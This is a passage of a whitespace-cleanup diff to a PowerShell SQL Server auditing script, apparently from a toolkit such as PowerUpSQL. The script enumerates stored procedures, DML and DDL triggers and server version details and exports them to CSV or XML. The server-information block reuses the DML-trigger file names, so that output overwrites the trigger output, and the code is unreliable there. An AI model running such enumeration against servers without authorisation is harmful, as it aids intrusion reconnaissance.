+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
+
         # Getting Stored Procedures
         Write-Verbose -Message "$Instance - Getting stored procedures..."
-        $Results = Get-SQLStoredProcedure -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose        
+        $Results = Get-SQLStoredProcedure -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_stored_procedure.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_stored_procedure.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }             
-        
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
+
         # Getting Triggers DML
         Write-Verbose -Message "$Instance - Getting DML triggers..."
-        $Results = Get-SQLTriggerDml -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose        
+        $Results = Get-SQLTriggerDml -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }     
-        
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
+
         # Getting Triggers DDL
         Write-Verbose -Message "$Instance - Getting DDL triggers..."
-        $Results = Get-SQLTriggerDdl -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose         
+        $Results = Get-SQLTriggerDdl -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_ddl.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_ddl.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }     
-        
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
+
         # Getting Version Information
         Write-Verbose -Message "$Instance - Getting server version information..."
-        $Results = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose         
+        $Results = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }     
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
 
-        Write-Verbose -Message "$Instance - END"       
+        Write-Verbose -Message "$Instance - END"
     }
-        
+
     End
-    {  
+    {
     }
 }
 
